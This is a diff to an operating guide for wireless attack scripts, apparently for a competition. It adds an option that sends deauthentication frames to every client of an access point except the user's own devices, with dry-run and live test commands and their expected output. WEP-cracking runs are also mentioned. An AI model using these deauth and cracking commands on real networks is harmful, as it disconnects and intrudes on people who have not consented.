@@ -213,11 +213,14 @@ Prepare:
 
    Leave this file out to target every client of the AP at once (the broadcast address).
 
+   Or use `-x` (section 12.10): list only your own devices, and the run targets every other client it sees, read again every round.
+
 **In the window, run it.** The card goes into monitor mode, so the laptop's own Wi-Fi drops, as it does during a capture. Run this or a capture, not both.
 
 ```bash
 sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window
 sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window -f clients.txt
+sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window -x logs/own-devices.txt
 ```
 
 - `-M wlp2s0mon` takes the place of `-i wlp2s0` when a crack already runs on that monitor (section 12.7). This run then neither starts nor stops the monitor, and WiFi stays as the crack left it. `wep-crack.sh -M` joins a monitor the same way (section 12.9).
@@ -225,6 +228,7 @@ sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM
 - `-u HH:MM` is optional. Use it for the window's end: the run stops by itself at that time, on this machine's clock. Without it, the run goes until `-r` rounds or Ctrl-C.
 - `-f clients.txt` is optional. With it, each round makes one call per listed client. Without it, each round
   makes one call to the broadcast address, which reaches every client.
+- `-x logs/own-devices.txt` is optional, and replaces `-f`: each round targets every other client that the run's capture lists on the AP, minus the MACs in that file. Nothing is broadcast, and a round with no other client is skipped (section 12.10).
 - `-r N` is optional: stop after N rounds (a short test). Without it, the run goes until `-u` or Ctrl-C.
 - You type `START` at the prompt. Ctrl-C stops the run and restores WiFi.
 - Each round sends 5 frames per target and then waits 2 s. A call still running after 30 s is stopped.
@@ -379,3 +383,29 @@ sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <GL BSSID> -c 11 -m passive
 sudo ./scripts/wep-crack.sh -i wlp2s0mon -b <GL BSSID> -c 6 -m passive
 ```
 Expect `[!] wlp2s0mon reports channel '6', not 11. Nothing was changed.` for the first. For the second, expect `[!] wlp2s0mon is already in monitor mode, so nothing was changed.`, then `give it with -M`, then the `wifi-recover.sh` hint.
+
+### 12.10 Deauth to the other clients only (sends frames)
+
+`-x` targets every other client of the router and leaves out the MACs in your own-devices file. Each round reads the run's own capture again, so a client that joins later is reached on the next round. Nothing is broadcast. Run it on the GL router first.
+
+1. Your own addresses go in `logs/own-devices.txt`, one per line: your phone's (its address on this router, as in 12.4) and the ESP32's (the `station MAC` line in its serial log at startup). A `#` starts a comment.
+   ```bash
+   cat logs/own-devices.txt
+   ```
+   Expect one MAC per line, and nothing else.
+2. Dry run. It sends nothing, and it needs no card:
+   ```bash
+   ./scripts/competition-deauth.sh -b <GL BSSID> -c 6 -x logs/own-devices.txt --dry-run
+   ```
+   Expect `Left out of every round, never sent to: the N MAC(s) in logs/own-devices.txt, this card and the AP:`, with your addresses indented under it, then `Dry run: nothing was sent`. A line that is not a MAC makes the run refuse, and the run names it.
+3. The stations the run works from, before your addresses are taken out. Nothing is sent. Run it after a live run has started, with that run's folder:
+   ```bash
+   bash -c 'source scripts/wifi-lib.sh && stations_on_bssid logs/<run>/capture-01.csv <GL BSSID>'
+   ```
+   Expect one MAC per station on the router, your own among them.
+4. The live run, with your phone and the ESP32 connected and no other device. Type `START`:
+   ```bash
+   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <GL BSSID> -c 6 -x logs/own-devices.txt -r 5 --in-window
+   ```
+   Expect `N address(es) are left out of every round, listed in logs/<run>/excluded.txt.`, then one line per round: `round 1: no other client of <GL BSSID> in the capture yet`. Your addresses never appear in a round line, and nothing is sent while no other client is on the router.
+5. The same, with one other device on the GL router that is not in `own-devices.txt` (a spare phone, switched on). **This sends frames to that device only.** Expect `round N: 1 other client(s): <its MAC>`, then `round N <its MAC>: ...` lines, and no line for your own addresses.
